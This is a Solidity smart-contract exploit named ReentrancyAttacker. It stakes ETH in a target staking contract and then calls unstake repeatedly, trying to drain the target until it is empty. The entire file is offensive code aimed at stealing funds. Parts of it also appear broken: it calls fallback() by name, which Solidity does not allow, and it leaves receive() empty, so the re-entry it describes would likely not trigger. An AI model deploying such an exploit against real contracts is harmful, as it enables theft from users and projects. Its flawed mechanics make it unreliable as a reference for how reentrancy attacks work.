pragma solidity ^0.8.0;
contract ReentrancyAttacker {
    address public stake;

    constructor(address _stake) {
        stake = _stake;
    }

    function attack() external payable {
        (bool success, ) = stake.call(abi.encodeWithSelector(0x3f83bcf7, msg.value));  // StakeETH
        require(success, "StakeETH failed");
        
        (success, ) = stake.call(abi.encodeWithSelector(0x7a0e14fd, 1000000000000000000));  // Unstake 1 ETH
        require(success, "First unstake failed");
    }

    fallback() external {
        (bool success, ) = stake.call(abi.encodeWithSelector(0x7a0e14fd, 1000000000000000000));  // Loop reentrancy
        if (success) {
            // Recurse until contract is empty
            fallback();
        }
    }

    receive() external payable {
        // Reentrancy trigger
    }
}